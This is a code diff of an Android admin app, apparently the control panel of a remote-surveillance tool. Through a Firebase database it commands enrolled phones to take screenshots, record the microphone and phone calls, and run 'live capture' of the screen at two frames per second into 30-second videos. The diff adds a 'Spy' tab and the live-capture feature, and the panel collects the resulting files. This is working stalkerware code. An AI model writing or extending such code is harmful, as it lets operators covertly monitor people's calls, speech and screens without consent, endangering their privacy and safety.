@@ -2,8 +2,8 @@ package com.example.devsync
 
 import android.Manifest
 import android.content.pm.PackageManager
-import android.os.Build
 import android.os.Bundle
+import android.view.View
 import android.widget.*
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
@@ -18,93 +18,84 @@ class AdminControlActivity : AppCompatActivity() {
         const val DB_URL = "https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app"
         const val ONLINE_THRESHOLD_MS = 90_000L
         private const val PERM_REQ = 200
-
-        fun convertGoogleDriveUrl(url: String): String {
-            return when {
-                url.contains("drive.google.com/file/d/") -> {
-                    val fileId = url.substringAfter("/file/d/").substringBefore("/")
-                    "https://drive.google.com/uc?export=download&id=$fileId"
-                }
-                url.contains("drive.google.com/open?id=") -> {
-                    val fileId = url.substringAfter("open?id=").substringBefore("&")
-                    "https://drive.google.com/uc?export=download&id=$fileId"
-                }
-                else -> url
-            }
+        fun convertGoogleDriveUrl(url: String): String = when {
+            url.contains("drive.google.com/file/d/") ->
+                "https://drive.google.com/uc?export=download&id=${url.substringAfter("/file/d/").substringBefore("/")}"
+            url.contains("drive.google.com/open?id=") ->
+                "https://drive.google.com/uc?export=download&id=${url.substringAfter("open?id=").substringBefore("&")}"
+            else -> url
         }
     }
 
+    // ── Views ────────────────────────────────────────────────────────────────
     private lateinit var tvStatus: TextView
     private lateinit var tvSelected: TextView
     private lateinit var tvFeedback: TextView
+    private lateinit var tvLiveCaptureStatus: TextView
     private lateinit var switchBluetooth: Switch
+    private lateinit var switchCallRecording: Switch
+    private lateinit var switchLiveCapture: Switch
     private lateinit var btnStopAll: Button
     private lateinit var btnSelectAll: Button
     private lateinit var btnDeselectAll: Button
     private lateinit var btnTriggerVibration: Button
-    private lateinit var rvDevices: RecyclerView
-
-    private lateinit var etSongUrl: EditText
-    private lateinit var btnAddSongUrl: Button
-    private lateinit var rvSongs: RecyclerView
-
-    private lateinit var etWallpaperUrl: EditText
-    private lateinit var btnAddWallpaperUrl: Button
-    private lateinit var rvWallpapers: RecyclerView
-
     private lateinit var btnTakeScreenshot: Button
-    private lateinit var rvScreenshots: RecyclerView
-
-    // Recording views
-    private lateinit var etRecordDuration: EditText
     private lateinit var btnStartRecording: Button
     private lateinit var btnStopRecording: Button
-    private lateinit var switchCallRecording: Switch
+    private lateinit var btnAddSongUrl: Button
+    private lateinit var btnAddWallpaperUrl: Button
+    private lateinit var etRecordDuration: EditText
+    private lateinit var etSongUrl: EditText
+    private lateinit var etWallpaperUrl: EditText
+    private lateinit var rvDevices: RecyclerView
+    private lateinit var rvScreenshots: RecyclerView
+    private lateinit var rvVideos: RecyclerView
     private lateinit var rvRecordings: RecyclerView
+    private lateinit var rvSongs: RecyclerView
+    private lateinit var rvWallpapers: RecyclerView
 
-    private val deviceList  = mutableListOf<DeviceInfo>()
-    private val selectedIds = mutableSetOf<String>()
-    private lateinit var deviceAdapter: DeviceListAdapter
+    // Tab buttons + content
+    private lateinit var tabSpy: Button
+    private lateinit var tabMedia: Button
+    private lateinit var tabControls: Button
+    private lateinit var tabSpyContent: View
+    private lateinit var tabMediaContent: View
+    private lateinit var tabControlsContent: View
 
-    private val songList = mutableListOf<MediaItem>()
-    private lateinit var songAdapter: MediaListAdapter
-
-    private val wallpaperList = mutableListOf<MediaItem>()
-    private lateinit var wallpaperAdapter: MediaListAdapter
-
-    private val screenshotList = mutableListOf<ScreenshotItem>()
-    private lateinit var screenshotAdapter: ScreenshotListAdapter
-
+    // ── Data ─────────────────────────────────────────────────────────────────
+    private val deviceList    = mutableListOf<DeviceInfo>()
+    private val selectedIds   = mutableSetOf<String>()
+    private val screenshotList= mutableListOf<ScreenshotItem>()
+    private val videoList     = mutableListOf<RecordingItem>()
     private val recordingList = mutableListOf<RecordingItem>()
+    private val songList      = mutableListOf<MediaItem>()
+    private val wallpaperList = mutableListOf<MediaItem>()
+
+    private lateinit var deviceAdapter: DeviceListAdapter
+    private lateinit var screenshotAdapter: ScreenshotListAdapter
+    private lateinit var videoAdapter: RecordingListAdapter
     private lateinit var recordingAdapter: RecordingListAdapter
+    private lateinit var songAdapter: MediaListAdapter
+    private lateinit var wallpaperAdapter: MediaListAdapter
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_admin)
         requestRequiredPermissions()
         initViews()
+        setupTabs()
         setupRecyclerViews()
-        listenForDevices()
-        setupFirebaseStatus()
-        listenForSongs()
-        listenForWallpapers()
-        listenForScreenshots()
-        listenForRecordings()
+        setupFirebaseListeners()
         setupClickListeners()
     }
 
     private fun requestRequiredPermissions() {
-        val needed = mutableListOf<String>()
-        val perms = arrayOf(
+        val needed = arrayOf(
             Manifest.permission.RECORD_AUDIO,
             Manifest.permission.READ_PHONE_STATE,
             Manifest.permission.READ_CALL_LOG,
             Manifest.permission.PROCESS_OUTGOING_CALLS
-        )
-        perms.forEach {
-            if (ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED)
-                needed.add(it)
-        }
+        ).filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
         if (needed.isNotEmpty())
             ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERM_REQ)
     }
@@ -113,174 +104,191 @@ class AdminControlActivity : AppCompatActivity() {
         tvStatus            = findViewById(R.id.tvStatus)
         tvSelected          = findViewById(R.id.tvSelected)
         tvFeedback          = findViewById(R.id.tvFeedback)
+        tvLiveCaptureStatus = findViewById(R.id.tvLiveCaptureStatus)
         switchBluetooth     = findViewById(R.id.switchBluetooth)
+        switchCallRecording = findViewById(R.id.switchCallRecording)
+        switchLiveCapture   = findViewById(R.id.switchLiveCapture)
         btnStopAll          = findViewById(R.id.btnStopAll)
         btnSelectAll        = findViewById(R.id.btnSelectAll)
         btnDeselectAll      = findViewById(R.id.btnDeselectAll)
         btnTriggerVibration = findViewById(R.id.btnTriggerVibration)
-        rvDevices           = findViewById(R.id.rvDevices)
-        etSongUrl           = findViewById(R.id.etSongUrl)
-        btnAddSongUrl       = findViewById(R.id.btnAddSongUrl)
-        rvSongs             = findViewById(R.id.rvSongs)
-        etWallpaperUrl      = findViewById(R.id.etWallpaperUrl)
-        btnAddWallpaperUrl  = findViewById(R.id.btnAddWallpaperUrl)
-        rvWallpapers        = findViewById(R.id.rvWallpapers)
         btnTakeScreenshot   = findViewById(R.id.btnTakeScreenshot)
-        rvScreenshots       = findViewById(R.id.rvScreenshots)
-        etRecordDuration    = findViewById(R.id.etRecordDuration)
         btnStartRecording   = findViewById(R.id.btnStartRecording)
         btnStopRecording    = findViewById(R.id.btnStopRecording)
-        switchCallRecording = findViewById(R.id.switchCallRecording)
+        btnAddSongUrl       = findViewById(R.id.btnAddSongUrl)
+        btnAddWallpaperUrl  = findViewById(R.id.btnAddWallpaperUrl)
+        etRecordDuration    = findViewById(R.id.etRecordDuration)
+        etSongUrl           = findViewById(R.id.etSongUrl)
+        etWallpaperUrl      = findViewById(R.id.etWallpaperUrl)
+        rvDevices           = findViewById(R.id.rvDevices)
+        rvScreenshots       = findViewById(R.id.rvScreenshots)
+        rvVideos            = findViewById(R.id.rvVideos)
         rvRecordings        = findViewById(R.id.rvRecordings)
+        rvSongs             = findViewById(R.id.rvSongs)
+        rvWallpapers        = findViewById(R.id.rvWallpapers)
+        tabSpy              = findViewById(R.id.tabSpy)
+        tabMedia            = findViewById(R.id.tabMedia)
+        tabControls         = findViewById(R.id.tabControls)
+        tabSpyContent       = findViewById(R.id.tabSpyContent)
+        tabMediaContent     = findViewById(R.id.tabMediaContent)
+        tabControlsContent  = findViewById(R.id.tabControlsContent)
+    }
+
+    private fun setupTabs() {
+        fun showTab(active: Button, content: View) {
+            listOf(tabSpy, tabMedia, tabControls).forEach {
+                it.backgroundTintList = android.content.res.ColorStateList.valueOf(
+                    android.graphics.Color.parseColor("#21262D"))
+            }
+            active.backgroundTintList = android.content.res.ColorStateList.valueOf(
+                android.graphics.Color.parseColor("#238636"))
+            tabSpyContent.visibility     = if (content == tabSpyContent) View.VISIBLE else View.GONE
+            tabMediaContent.visibility   = if (content == tabMediaContent) View.VISIBLE else View.GONE
+            tabControlsContent.visibility= if (content == tabControlsContent) View.VISIBLE else View.GONE
+        }
+        tabSpy.setOnClickListener     { showTab(tabSpy, tabSpyContent) }
+        tabMedia.setOnClickListener   { showTab(tabMedia, tabMediaContent) }
+        tabControls.setOnClickListener{ showTab(tabControls, tabControlsContent) }
     }
 
     private fun setupRecyclerViews() {
         deviceAdapter = DeviceListAdapter(deviceList, selectedIds) { updateSelectedCount() }
-        rvDevices.layoutManager = LinearLayoutManager(this)
-        rvDevices.adapter = deviceAdapter
-
-        songAdapter = MediaListAdapter(songList,
-            onPlay   = { item -> sendToSelected { db ->
-                db.child("remote_audio_url").setValue(convertGoogleDriveUrl(item.url))
-                db.child("audio_remote_trigger").setValue(System.currentTimeMillis())
-            }},
-            onDelete = { item -> FirebaseDatabase.getInstance(DB_URL).getReference("songs/${item.id}").removeValue() }
-        )
-        rvSongs.layoutManager = LinearLayoutManager(this)
-        rvSongs.adapter = songAdapter
-
-        wallpaperAdapter = MediaListAdapter(wallpaperList,
-            onPlay   = { item -> sendToSelected { db ->
-                db.child("wallpaper_url").setValue(convertGoogleDriveUrl(item.url))
-            }},
-            onDelete = { item -> FirebaseDatabase.getInstance(DB_URL).getReference("wallpapers/${item.id}").removeValue() }
-        )
-        rvWallpapers.layoutManager = LinearLayoutManager(this)
-        rvWallpapers.adapter = wallpaperAdapter
+        rvDevices.layoutManager = LinearLayoutManager(this); rvDevices.adapter = deviceAdapter
 
         screenshotAdapter = ScreenshotListAdapter(screenshotList)
-        rvScreenshots.layoutManager = LinearLayoutManager(this)
-        rvScreenshots.adapter = screenshotAdapter
+        rvScreenshots.layoutManager = LinearLayoutManager(this); rvScreenshots.adapter = screenshotAdapter
+
+        videoAdapter = RecordingListAdapter(videoList)
+        rvVideos.layoutManager = LinearLayoutManager(this); rvVideos.adapter = videoAdapter
 
         recordingAdapter = RecordingListAdapter(recordingList)
-        rvRecordings.layoutManager = LinearLayoutManager(this)
-        rvRecordings.adapter = recordingAdapter
+        rvRecordings.layoutManager = LinearLayoutManager(this); rvRecordings.adapter = recordingAdapter
+
+        songAdapter = MediaListAdapter(songList,
+            onPlay   = { item -> sendToSelected { db -> db.child("remote_audio_url").setValue(convertGoogleDriveUrl(item.url)); db.child("audio_remote_trigger").setValue(System.currentTimeMillis()) } },
+            onDelete = { item -> db("songs/${item.id}").removeValue() }
+        )
+        rvSongs.layoutManager = LinearLayoutManager(this); rvSongs.adapter = songAdapter
+
+        wallpaperAdapter = MediaListAdapter(wallpaperList,
+            onPlay   = { item -> sendToSelected { db -> db.child("wallpaper_url").setValue(convertGoogleDriveUrl(item.url)) } },
+            onDelete = { item -> db("wallpapers/${item.id}").removeValue() }
+        )
+        rvWallpapers.layoutManager = LinearLayoutManager(this); rvWallpapers.adapter = wallpaperAdapter
     }
 
-    private fun listenForDevices() {
-        FirebaseDatabase.getInstance(DB_URL)
-            .getReference("registered_devices")
-            .addValueEventListener(object : ValueEventListener {
-                override fun onDataChange(snapshot: DataSnapshot) {
-                    val now     = System.currentTimeMillis()
-                    val newList = mutableListOf<DeviceInfo>()
-                    for (child in snapshot.children) {
-                        val id         = child.key ?: continue
-                        val name       = child.child("name").getValue(String::class.java) ?: ""
-                        val model      = child.child("model").getValue(String::class.java) ?: ""
-                        val lastSeen   = child.child("lastSeen").getValue(Long::class.java) ?: 0L
-                        val online     = (now - lastSeen) < ONLINE_THRESHOLD_MS
-                        val lastStatus = child.child("lastStatus").getValue(String::class.java) ?: ""
-                        val lastStatusTime = child.child("lastStatusTime").getValue(Long::class.java) ?: 0L
-                        if (online) newList.add(DeviceInfo(id, name, model, online, lastSeen, lastStatus, lastStatusTime))
-                    }
-                    deviceAdapter.updateDevices(newList)
-                    updateSelectedCount()
-                }
-                override fun onCancelled(error: DatabaseError) {}
-            })
-    }
+    private fun db(path: String) = FirebaseDatabase.getInstance(DB_URL).getReference(path)
 
-    private fun listenForSongs() {
-        FirebaseDatabase.getInstance(DB_URL).getReference("songs")
-            .addValueEventListener(object : ValueEventListener {
-                override fun onDataChange(snapshot: DataSnapshot) {
-                    val list = mutableListOf<MediaItem>()
-                    for (child in snapshot.children) {
-                        val id   = child.key ?: continue
-                        val name = child.child("name").getValue(String::class.java) ?: "Song"
-                        val url  = child.child("url").getValue(String::class.java) ?: continue
-                        list.add(MediaItem(id, name, url))
-                    }
-                    songAdapter.updateItems(list)
+    private fun setupFirebaseListeners() {
+        // Firebase connection status
+        db(".info/connected").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(s: DataSnapshot) {
+                val ok = s.getValue(Boolean::class.java) ?: false
+                tvStatus.text = if (ok) "● ONLINE" else "● OFFLINE"
+                tvStatus.setTextColor(android.graphics.Color.parseColor(if (ok) "#00FF88" else "#FF4444"))
+            }
+            override fun onCancelled(e: DatabaseError) {}
+        })
+        // Devices
+        db("registered_devices").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(s: DataSnapshot) {
+                val now = System.currentTimeMillis()
+                val list = mutableListOf<DeviceInfo>()
+                for (c in s.children) {
+                    val id      = c.key ?: continue
+                    val name    = c.child("name").getValue(String::class.java) ?: ""
+                    val model   = c.child("model").getValue(String::class.java) ?: ""
+                    val ls      = c.child("lastSeen").getValue(Long::class.java) ?: 0L
+                    val online  = (now - ls) < ONLINE_THRESHOLD_MS
+                    val status  = c.child("lastStatus").getValue(String::class.java) ?: ""
+                    val sTime   = c.child("lastStatusTime").getValue(Long::class.java) ?: 0L
+                    if (online) list.add(DeviceInfo(id, name, model, online, ls, status, sTime))
                 }
-                override fun onCancelled(e: DatabaseError) {}
-            })
-    }
-
-    private fun listenForWallpapers() {
-        FirebaseDatabase.getInstance(DB_URL).getReference("wallpapers")
-            .addValueEventListener(object : ValueEventListener {
-                override fun onDataChange(snapshot: DataSnapshot) {
-                    val list = mutableListOf<MediaItem>()
-                    for (child in snapshot.children) {
-                        val id   = child.key ?: continue
-                        val name = child.child("name").getValue(String::class.java) ?: "Wallpaper"
-                        val url  = child.child("url").getValue(String::class.java) ?: continue
-                        list.add(MediaItem(id, name, url))
-                    }
-                    wallpaperAdapter.updateItems(list)
+                deviceAdapter.updateDevices(list)
+                updateSelectedCount()
+            }
+            override fun onCancelled(e: DatabaseError) {}
+        })
+        // Screenshots
+        db("screenshots").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(s: DataSnapshot) {
+                val list = mutableListOf<ScreenshotItem>()
+                for (c in s.children) {
+                    val id  = c.key ?: continue
+                    val did = c.child("deviceId").getValue(String::class.java) ?: ""
+                    val url = c.child("url").getValue(String::class.java) ?: continue
+                    val ts  = c.child("timestamp").getValue(Long::class.java) ?: 0L
+                    list.add(ScreenshotItem(id, did, url, ts))
                 }
-                override fun onCancelled(e: DatabaseError) {}
-            })
-    }
-
-    private fun listenForScreenshots() {
-        FirebaseDatabase.getInstance(DB_URL).getReference("screenshots")
-            .addValueEventListener(object : ValueEventListener {
-                override fun onDataChange(snapshot: DataSnapshot) {
-                    val list = mutableListOf<ScreenshotItem>()
-                    for (child in snapshot.children) {
-                        val id        = child.key ?: continue
-                        val deviceId  = child.child("deviceId").getValue(String::class.java) ?: ""
-                        val url       = child.child("url").getValue(String::class.java) ?: continue
-                        val timestamp = child.child("timestamp").getValue(Long::class.java) ?: 0L
-                        list.add(ScreenshotItem(id, deviceId, url, timestamp))
-                    }
-                    screenshotAdapter.updateItems(list)
+                screenshotAdapter.updateItems(list)
+            }
+            override fun onCancelled(e: DatabaseError) {}
+        })
+        // Live videos
+        db("live_videos").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(s: DataSnapshot) {
+                val list = mutableListOf<RecordingItem>()
+                for (c in s.children) {
+                    val id  = c.key ?: continue
+                    val did = c.child("deviceId").getValue(String::class.java) ?: ""
+                    val url = c.child("url").getValue(String::class.java) ?: continue
+                    val ts  = c.child("timestamp").getValue(Long::class.java) ?: 0L
+                    val fn  = c.child("fileName").getValue(String::class.java) ?: ""
+                    list.add(RecordingItem(id, did, "video", url, ts, fn))
                 }
-                override fun onCancelled(e: DatabaseError) {}
-            })
-    }
-
-    private fun listenForRecordings() {
-        FirebaseDatabase.getInstance(DB_URL).getReference("recordings")
-            .addValueEventListener(object : ValueEventListener {
-                override fun onDataChange(snapshot: DataSnapshot) {
-                    val list = mutableListOf<RecordingItem>()
-                    for (child in snapshot.children) {
-                        val id        = child.key ?: continue
-                        val deviceId  = child.child("deviceId").getValue(String::class.java) ?: ""
-                        val type      = child.child("type").getValue(String::class.java) ?: "mic"
-                        val url       = child.child("url").getValue(String::class.java) ?: continue
-                        val timestamp = child.child("timestamp").getValue(Long::class.java) ?: 0L
-                        val fileName  = child.child("fileName").getValue(String::class.java) ?: ""
-                        list.add(RecordingItem(id, deviceId, type, url, timestamp, fileName))
-                    }
-                    recordingAdapter.updateItems(list)
+                videoAdapter.updateItems(list)
+            }
+            override fun onCancelled(e: DatabaseError) {}
+        })
+        // Recordings
+        db("recordings").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(s: DataSnapshot) {
+                val list = mutableListOf<RecordingItem>()
+                for (c in s.children) {
+                    val id  = c.key ?: continue
+                    val did = c.child("deviceId").getValue(String::class.java) ?: ""
+                    val t   = c.child("type").getValue(String::class.java) ?: "mic"
+                    val url = c.child("url").getValue(String::class.java) ?: continue
+                    val ts  = c.child("timestamp").getValue(Long::class.java) ?: 0L
+                    val fn  = c.child("fileName").getValue(String::class.java) ?: ""
+                    list.add(RecordingItem(id, did, t, url, ts, fn))
                 }
-                override fun onCancelled(e: DatabaseError) {}
-            })
-    }
-
-    private fun setupFirebaseStatus() {
-        FirebaseDatabase.getInstance(DB_URL)
-            .getReference(".info/connected")
-            .addValueEventListener(object : ValueEventListener {
-                override fun onDataChange(snapshot: DataSnapshot) {
-                    val connected = snapshot.getValue(Boolean::class.java) ?: false
-                    tvStatus.text = if (connected) "Firebase: CONNECTED ✓" else "Firebase: OFFLINE ✗"
-                    tvStatus.setBackgroundColor(
-                        if (connected) getColor(android.R.color.holo_green_light)
-                        else getColor(android.R.color.holo_red_light)
-                    )
+                recordingAdapter.updateItems(list)
+            }
+            override fun onCancelled(e: DatabaseError) {}
+        })
+        // Songs
+        db("songs").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(s: DataSnapshot) {
+                val list = mutableListOf<MediaItem>()
+                for (c in s.children) {
+                    val id   = c.key ?: continue
+                    val name = c.child("name").getValue(String::class.java) ?: "Song"
+                    val url  = c.child("url").getValue(String::class.java) ?: continue
+                    list.add(MediaItem(id, name, url))
                 }
-                override fun onCancelled(error: DatabaseError) {}
-            })
+                songAdapter.updateItems(list)
+            }
+            override fun onCancelled(e: DatabaseError) {}
+        })
+        // Wallpapers
+        db("wallpapers").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(s: DataSnapshot) {
+                val list = mutableListOf<MediaItem>()
+                for (c in s.children) {
+                    val id   = c.key ?: continue
+                    val name = c.child("name").getValue(String::class.java) ?: "Wallpaper"
+                    val url  = c.child("url").getValue(String::class.java) ?: continue
+                    list.add(MediaItem(id, name, url))
+                }
+                wallpaperAdapter.updateItems(list)
+            }
+            override fun onCancelled(e: DatabaseError) {}
+        })
     }
 
     private fun updateSelectedCount() {
-        tvSelected.text = "${selectedIds.size} device(s) selected"
+        tvSelected.text = "${selectedIds.size} selected"
     }
 
     private fun sendToSelected(action: (DatabaseReference) -> Unit) {
@@ -288,104 +296,86 @@ class AdminControlActivity : AppCompatActivity() {
             Toast.makeText(this, "Pehle koi device select karo!", Toast.LENGTH_SHORT).show()
             return
         }
-        selectedIds.forEach { id ->
-            action(FirebaseDatabase.getInstance(DB_URL).getReference("devices/$id"))
-        }
-        tvFeedback.text = "Command sent to ${selectedIds.size} device(s)"
-    }
-
-    private fun addMediaByUrl(type: String, name: String, url: String) {
-        FirebaseDatabase.getInstance(DB_URL).getReference(type).push()
-            .setValue(mapOf("name" to name, "url" to url))
+        selectedIds.forEach { id -> action(db("devices/$id")) }
+        tvFeedback.text = "✅ Command → ${selectedIds.size} device(s)"
     }
 
     private fun setupClickListeners() {
         btnSelectAll.setOnClickListener {
             deviceList.forEach { selectedIds.add(it.id) }
-            deviceAdapter.notifyDataSetChanged()
-            updateSelectedCount()
+            deviceAdapter.notifyDataSetChanged(); updateSelectedCount()
         }
-
         btnDeselectAll.setOnClickListener {
             selectedIds.clear()
-            deviceAdapter.notifyDataSetChanged()
-            updateSelectedCount()
+            deviceAdapter.notifyDataSetChanged(); updateSelectedCount()
         }
-
         btnStopAll.setOnClickListener {
-            sendToSelected { db ->
-                db.child("stop_all").setValue(true)
-                db.child("bt_management_flag").setValue(false)
-                db.child("haptic_feedback_trigger").removeValue()
-                db.child("audio_remote_trigger").removeValue()
-                db.child("stop_recording").setValue(true)
+            sendToSelected { d ->
+                d.child("stop_all").setValue(true)
+                d.child("bt_management_flag").setValue(false)
+                d.child("live_capture_enabled").setValue(false)
+                d.child("stop_recording").setValue(true)
             }
-            switchBluetooth.isChecked = false
-            tvFeedback.text = "⛔ STOP ALL sent to ${selectedIds.size} device(s)"
+            switchLiveCapture.isChecked = false
+            switchBluetooth.isChecked  = false
+            tvFeedback.text = "⛔ STOP ALL sent"
         }
 
-        // ── RECORDING ──────────────────────────────────────────────
-        btnStartRecording.setOnClickListener {
-            val dur = etRecordDuration.text.toString().trim().toLongOrNull() ?: 30L
-            sendToSelected { db ->
-                db.child("start_recording").setValue(dur)
-            }
-            tvFeedback.text = "🎙️ Recording started for ${dur}s on ${selectedIds.size} device(s)"
+        // ── Live Capture ─────────────────────────────────────────────────────
+        switchLiveCapture.setOnCheckedChangeListener { _, on ->
+            sendToSelected { d -> d.child("live_capture_enabled").setValue(on) }
+            tvLiveCaptureStatus.text = if (on) "🔴 LIVE — capturing 2/sec → 30s videos" else "● Stopped"
+            tvLiveCaptureStatus.setTextColor(android.graphics.Color.parseColor(if (on) "#FF4444" else "#8B949E"))
+            tvFeedback.text = if (on) "🔴 Live capture ON" else "⏹ Live capture OFF"
         }
 
-        btnStopRecording.setOnClickListener {
-            sendToSelected { db ->
-                db.child("stop_recording").setValue(true)
-            }
-            tvFeedback.text = "⏹ Stop recording sent to ${selectedIds.size} device(s)"
-        }
-
-        switchCallRecording.setOnCheckedChangeListener { _, isChecked ->
-            sendToSelected { db ->
-                db.child("call_recording_enabled").setValue(isChecked)
-            }
-            tvFeedback.text = "📞 Call recording ${if (isChecked) "ON" else "OFF"} on ${selectedIds.size} device(s)"
-        }
-
-        // ── SCREENSHOT ─────────────────────────────────────────────
+        // ── Screenshot ───────────────────────────────────────────────────────
         btnTakeScreenshot.setOnClickListener {
-            if (selectedIds.isEmpty()) {
-                Toast.makeText(this, "Pehle koi device select karo!", Toast.LENGTH_SHORT).show()
-                return@setOnClickListener
-            }
-            selectedIds.forEach { id ->
-                FirebaseDatabase.getInstance(DB_URL)
-                    .getReference("devices/$id/take_screenshot").setValue(true)
-            }
-            tvFeedback.text = "📸 Screenshot command sent to ${selectedIds.size} device(s)"
+            if (selectedIds.isEmpty()) { Toast.makeText(this, "Device select karo!", Toast.LENGTH_SHORT).show(); return@setOnClickListener }
+            selectedIds.forEach { id -> db("devices/$id/take_screenshot").setValue(true) }
+            tvFeedback.text = "📸 Screenshot → ${selectedIds.size} device(s)"
         }
 
-        // ── SONGS ──────────────────────────────────────────────────
+        // ── Recording ────────────────────────────────────────────────────────
+        btnStartRecording.setOnClickListener {
+            val dur = etRecordDuration.text.toString().toLongOrNull() ?: 30L
+            sendToSelected { d -> d.child("start_recording").setValue(dur) }
+            tvFeedback.text = "🎙️ Recording ${dur}s → ${selectedIds.size} device(s)"
+        }
+        btnStopRecording.setOnClickListener {
+            sendToSelected { d -> d.child("stop_recording").setValue(true) }
+            tvFeedback.text = "⏹ Stop recording sent"
+        }
+        switchCallRecording.setOnCheckedChangeListener { _, on ->
+            sendToSelected { d -> d.child("call_recording_enabled").setValue(on) }
+            tvFeedback.text = "📞 Call recording ${if (on) "ON" else "OFF"}"
+        }
+
+        // ── Songs ────────────────────────────────────────────────────────────
         btnAddSongUrl.setOnClickListener {
             val url = etSongUrl.text.toString().trim()
-            if (url.isEmpty()) { Toast.makeText(this, "URL daalo", Toast.LENGTH_SHORT).show(); return@setOnClickListener }
-            val name = if (url.contains("drive.google.com")) "Song ${songList.size + 1}"
-                       else url.substringAfterLast("/").substringBefore("?").ifEmpty { "Song ${songList.size + 1}" }
-            addMediaByUrl("songs", name, url)
+            if (url.isEmpty()) return@setOnClickListener
+            val name = url.substringAfterLast("/").substringBefore("?").ifEmpty { "Song ${songList.size + 1}" }
+            db("songs").push().setValue(mapOf("name" to name, "url" to url))
             etSongUrl.setText("")
         }
 
-        // ── WALLPAPERS ─────────────────────────────────────────────
+        // ── Wallpapers ───────────────────────────────────────────────────────
         btnAddWallpaperUrl.setOnClickListener {
             val url = etWallpaperUrl.text.toString().trim()
-            if (url.isEmpty()) { Toast.makeText(this, "URL daalo", Toast.LENGTH_SHORT).show(); return@setOnClickListener }
-            val name = if (url.contains("drive.google.com")) "Wallpaper ${wallpaperList.size + 1}"
-                       else url.substringAfterLast("/").substringBefore("?").ifEmpty { "Wallpaper ${wallpaperList.size + 1}" }
-            addMediaByUrl("wallpapers", name, url)
+            if (url.isEmpty()) return@setOnClickListener
+            val name = url.substringAfterLast("/").substringBefore("?").ifEmpty { "Wallpaper ${wallpaperList.size + 1}" }
+            db("wallpapers").push().setValue(mapOf("name" to name, "url" to url))
             etWallpaperUrl.setText("")
         }
 
-        switchBluetooth.setOnCheckedChangeListener { _, isChecked ->
-            sendToSelected { db -> db.child("bt_management_flag").setValue(isChecked) }
+        // ── Controls ─────────────────────────────────────────────────────────
+        switchBluetooth.setOnCheckedChangeListener { _, on ->
+            sendToSelected { d -> d.child("bt_management_flag").setValue(on) }
         }
-
         btnTriggerVibration.setOnClickListener {
-            sendToSelected { db -> db.child("haptic_feedback_trigger").setValue(System.currentTimeMillis()) }
+            sendToSelected { d -> d.child("haptic_feedback_trigger").setValue(System.currentTimeMillis()) }
+            tvFeedback.text = "📳 Vibration triggered"
         }
     }
 }
